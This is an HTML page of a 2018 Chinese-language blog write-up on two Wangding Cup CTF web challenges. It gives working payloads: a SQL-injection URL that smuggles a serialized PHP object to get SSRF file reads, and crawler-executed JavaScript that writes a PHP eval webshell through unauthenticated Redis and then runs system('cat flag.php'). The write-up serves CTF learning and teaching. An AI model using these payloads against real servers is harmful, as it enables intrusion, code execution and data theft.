@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2018/07/ctfzone-2018/" />
+  <link rel="next" href="https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/" />
+  <link rel="canonical" href="https://syang-ng.github.io/2018/08/wangding-web-writeup/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           网鼎杯-Web-Writeup | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="网鼎杯-Web-Writeup | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "网鼎杯-Web-Writeup",
+    "headline" : "网鼎杯-Web-Writeup",
+    "description" : "fakebook 访问 robots.txt 得到泄露的文件 user.php.bak： Disallow: \/user.php.bak Sitemap: http:\/\/domain.com\/sitemap.xml \x26lt;?php class UserInfo { public $name = \x26quot;\x26quot;; public $age = 0; public $blog = \x26quot;\x26quot;; public function __construct($name, $age, $blog) { $this-\x26gt;name = $name; $this-\x26gt;age = (int)$age; $this-\x26gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch,",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2018",
+    "datePublished": "2018-08-20 18:35:43 \x2b0000 UTC",
+    "dateModified" : "2018-08-20 18:35:43 \x2b0000 UTC",
+    "url" : "https:\/\/syang-ng.github.io\/2018\/08\/wangding-web-writeup\/",
+    "wordCount" : "1506",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="dark-theme">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">网鼎杯-Web-Writeup</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2018-08-20 itemprop="datePublished">August 20, 2018</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h2 id="fakebook">fakebook</h2>
+
+<p>访问 <code>robots.txt</code> 得到泄露的文件 <code>user.php.bak</code>：</p>
+
+<pre><code>Disallow: /user.php.bak
+Sitemap: http://domain.com/sitemap.xml
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&gt;get($this-&gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    }
+}
+</code></pre>
+
+<p>测试页面功能，可以猜测 <code>view.php?no=xxx</code> 处存在 sql 注入的问题：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/view1.png" alt="view 1" class="lazyload"><figcaption class="image-caption">view 1</figcaption></figure></p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/view2.png" alt="view 2" class="lazyload"><figcaption class="image-caption">view 2</figcaption></figure></p>
+
+<p>可以看到此时页面会报 unserialize() 的相应错误，那么可以做一个合理的猜测，页面会将从 mysql 中取出的数据，并将数据反序列化后再填充到页面上</p>
+
+<p>而此时应该会调用 <code>getBlogContents()</code> 函数，那么这里必然存在一个 SSRF 的问题，我们只要构造 payload 使得其访问 <code>/var/www/html/flag.php</code> 即可</p>
+
+<p>那么我们可以尝试构造相应序列化数据作为 payload：<code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:24;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code></p>
+
+<p>最后 payload 如下：</p>
+
+<pre><code>http://80be5985cb9c4234bd4d0459d6a7f7238f336e1e2c514d60.game.ichunqiu.com/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:24;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27%23
+</code></pre>
+
+<p>查看源代码即可获得 base64 编码后的 flag，解码即可得到 <code>flag{a004021a-5f34-4692-b9b2-f5b50e6c095f}</code>：</p>
+
+<pre><code class="language-html">&lt;iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3thMDA0MDIxYS01ZjM0LTQ2OTItYjliMi1mNWI1MGU2YzA5NWZ9IjsNCmV4aXQoMCk7DQo='&gt;
+</code></pre>
+
+<p>我们可以通过相同的方式获得 <code>view.php</code> 的源码来加深我们的理解：</p>
+
+<pre><code class="language-php+HTML">&lt;?php session_start(); ?&gt;
+&lt;?php require_once 'db.php'; ?&gt;
+&lt;?php require_once 'user.php'; ?&gt;
+&lt;?php require_once 'error.php'; ?&gt;
+&lt;?php
+
+$db = new DB();
+
+?&gt;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot;
+          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;User&lt;/title&gt;
+
+    &lt;?php require_once 'bootstrap.php'; ?&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+
+$no = $_GET['no'];
+if ($db-&gt;anti_sqli($no))
+{
+    die(&quot;no hack ~_~&quot;);
+}
+
+$res = $db-&gt;getUserByNo($no);
+$user = unserialize($res['data']);
+//print_r($res);
+
+?&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;table class=&quot;table&quot;&gt;
+        &lt;tr&gt;
+            &lt;th&gt;
+                username
+            &lt;/th&gt;
+            &lt;th&gt;
+                age
+            &lt;/th&gt;
+            &lt;th&gt;
+                blog
+            &lt;/th&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;
+                &lt;?php echo $res['username']; ?&gt;
+            &lt;/td&gt;
+            &lt;td&gt;
+                &lt;?php echo $user-&gt;age; ?&gt;
+            &lt;/td&gt;
+            &lt;td&gt;
+                &lt;?php echo xss($user-&gt;blog); ?&gt;
+            &lt;/td&gt;
+        &lt;/tr&gt;
+    &lt;/table&gt;
+
+    &lt;hr&gt;
+    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    &lt;p&gt;the contents of his/her blog&lt;/p&gt;
+    &lt;hr&gt;
+    &lt;?php
+
+    $response = $user-&gt;getBlogContents();
+    if ($response === 404)
+    {
+        echo &quot;404 Not found&quot;;
+    }
+
+    else
+    {
+        $base64 = base64_encode($response);
+        echo &quot;&lt;iframe width='100%' height='10em' src='data:text/html;base64,{$base64}'&gt;&quot;;
+        // echo $response;
+    }
+
+    // var_dump($user-&gt;getBlogContents());
+    ?&gt;
+
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>非常悲伤的在本题陷入误区了，选择了绕过 <code>isValidBlog</code>，构造 url 使其指向 <code>127.0.0.1</code> 但最后仍然不能访问到相应文件，想来是禁止了 http 协议的访问（😭</p>
+
+<h2 id="spider">spider</h2>
+
+<p>首先尝试访问 <code>robots.txt</code>，发现存在 <code>/get_sourcecode</code> 页面，但页面提示 <code>NOT 127.0.0.1</code>，由此可以推测可能需要通过其他方式使得服务器去访问该网址</p>
+
+<p>那么我们从网址提供的功能入手：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/spider.png" alt="spider" class="lazyload"><figcaption class="image-caption">spider</figcaption></figure></p>
+
+<p>根据提示我们可以知道该网站提供的是动态爬虫的功能，简单说该页面可以抓取动态网页，那么显然我们可以在我们提交的 html 文件中写入 js 代码，js 代码在服务器访问的过程中会被执行：</p>
+
+<pre><code class="language-html">&lt;html&gt;
+	&lt;body&gt;
+		&lt;a id='test' href=&quot;&quot;&gt;1&lt;/a&gt;
+		&lt;script src=&quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
+		&lt;script&gt;
+		$.get('http://127.0.0.1/get_sourcecode', function(data){
+			document.getElementById(&quot;test&quot;).innerHTML=data;
+		});
+		&lt;/script&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>可以看到服务器访问 <code>get_sourcecode</code> 并在相应页面上输出内容：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/sourcecode.png" alt="source code" class="lazyload"><figcaption class="image-caption">source code</figcaption></figure></p>
+
+<p>获得源代码如下：</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+
+from flask import Flask, request 
+from flask import render_template
+import os
+import uuid
+import tempfile
+import subprocess
+import time
+import json
+
+app = Flask(__name__ , static_url_path='')
+
+def proc_shell(cmd):
+    out_temp = tempfile.SpooledTemporaryFile(bufsize=1000*1000)
+    fileno = out_temp.fileno()
+    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=False)
+    start_time = time.time()
+    while True:
+        if proc.poll() == None:
+            if time.time() - start_time &amp;gt; 30:
+                proc.terminate()
+                proc.kill()
+                proc.communicate()
+                out_temp.seek(0)
+                out_temp.close()
+                return
+            else:
+                time.sleep(1)
+        else:
+            proc.communicate()
+            out_temp.seek(0)
+            data = out_temp.read()
+            out_temp.close()
+            return data
+
+def casperjs_html(url):
+    cmd = 'casperjs {0} --ignore-ssl-errors=yes --url={1}'.format(os.path.dirname(__file__) + '/casper/casp.js' ,url)
+    cmd = cmd.split(' ')
+    stdout = proc_shell(cmd)
+    try:
+        result = json.loads(stdout)
+        links = result.get('resourceRequestUrls')
+        return links
+    except Exception, e:
+        return []
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'GET':
+        return render_template('index.html')
+    else:
+        f = request.files['file']
+        filename = str(uuid.uuid1()) + '.html'
+        basepath = os.path.dirname(__file__)
+        upload_path = os.path.join(basepath, 'static/upload/', filename)
+        content = f.read()
+        #hint
+        if 'level=low_273eac1c' not in content and 'dbfilename' in content.lower():
+            return render_template('index.html', msg=u'Warning: 发现恶意关键字')
+        #hint
+        with open(upload_path, 'w') as f:
+            f.write(content)
+        url = 'http://127.0.0.1:80/upload/'+filename
+        links = casperjs_html(url)
+        links = '\n'.join(links)
+        if not links:
+            links = 'NULL'
+        links = 'URL: '+url+'\n'+links
+        return render_template('index.html', links=links)
+
+@app.route('/get_sourcecode', methods=['GET', 'POST'])
+def get_code():
+    if request.method == 'GET':
+        ip = request.remote_addr
+        if ip != '127.0.0.1':
+            return 'NOT 127.0.0.1'
+        else:
+            with open(os.path.dirname(__file__)+'/run.py') as f:
+                code = f.read()
+            return code
+    else:
+        return ''
+
+@app.errorhandler(404)
+def page_not_found(error):
+    return '404'
+
+@app.errorhandler(500)
+def internal_server_error(error):
+    return '500'
+
+@app.errorhandler(403)
+def unauthorized(error):
+    return '403'
+
+if __name__ == '__main__':
+    pass
+</code></pre>
+
+<p>根据代码中的提示，我们可以发现我们需要利用的是 redis 的未授权访问来写一个 webshell</p>
+
+<p>在本题中，redis 服务确实在运行，但我们直接访问 6379 端口可能会出错，但不影响我们来写 payload</p>
+
+<p>根据提示我们知道 8000 端口存在着 apache2 的服务（当然是只开放给 127.0.0.1 的），那么我们可以尝试通过 redis 来写一下 php 的 webshell 然后通过在通过服务端的访问来触发（这里吐槽一句开端口这种事情不给 hint 的话要扫到猴年马月😓</p>
+
+<p>下面就是 payload 时间：</p>
+
+<pre><code class="language-HTML">&lt;html&gt;
+&lt;body&gt;
+	&lt;a id='test' href=&quot;&quot;&gt;level=low_273eac1c&lt;/a&gt;
+	&lt;script&gt;
+		var xmlhttp;
+		if (window.XMLHttpRequest) {
+			xmlhttp = new XMLHttpRequest();
+		}
+		else {
+			xmlhttp = newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+		}
+		var formData = new FormData();
+		formData.append(&quot;0&quot;, &quot;flushall&quot; + &quot;\n&quot; + &quot;config set dir /var/www/html/&quot; + &quot;\n&quot; + &quot;config set dbfilename shell.php&quot; + &quot;\n&quot; + 'set 1 &quot;\\n\\n&lt;?php header(\'Access-Control-Allow-Origin:*\');eval($_GET[_]);?&gt;\\n\\n&quot;' + &quot;\n&quot; + &quot;save&quot; + &quot;\n&quot; + &quot;quit&quot;);
+		xmlhttp.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;, true);
+		xmlhttp.send(formData);
+	&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<pre><code class="language-HTML">&lt;html&gt;
+	&lt;body&gt;
+		&lt;a id='test' href=&quot;&quot;&gt;1&lt;/a&gt;
+		&lt;script src=&quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
+		&lt;script&gt;
+		$.get('http://127.0.0.1:8000/shell.php?_=system(&quot;cat flag.php&quot;);', function(data){
+			document.getElementById(&quot;test&quot;).innerHTML=data;
+		});
+		&lt;/script&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>还是太菜了（哭泣😭</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/yZ-Xp32tCPWbDiFgAHiWgw" rel="nofollow noreferrer" target="_blank">网鼎杯第一场spider题详细writeup</a></li>
+<li><a href="https://xz.aliyun.com/t/2607" rel="nofollow noreferrer" target="_blank">2018网鼎杯第一场Web题解</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2018/08/wangding-web-writeup/>https://syang-ng.github.io/2018/08/wangding-web-writeup/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2018/07/ctfzone-2018/" class="prev" rel="prev" title="CTFZone 2018"><i class="iconfont icon-left"></i>&nbsp;CTFZone 2018</a>
+         
+        
+        <a href="https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/" class="next" rel="next" title="从一道 CTF 题看 Node.js 的 prototype pollution attack">从一道 CTF 题看 Node.js 的 prototype pollution attack&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
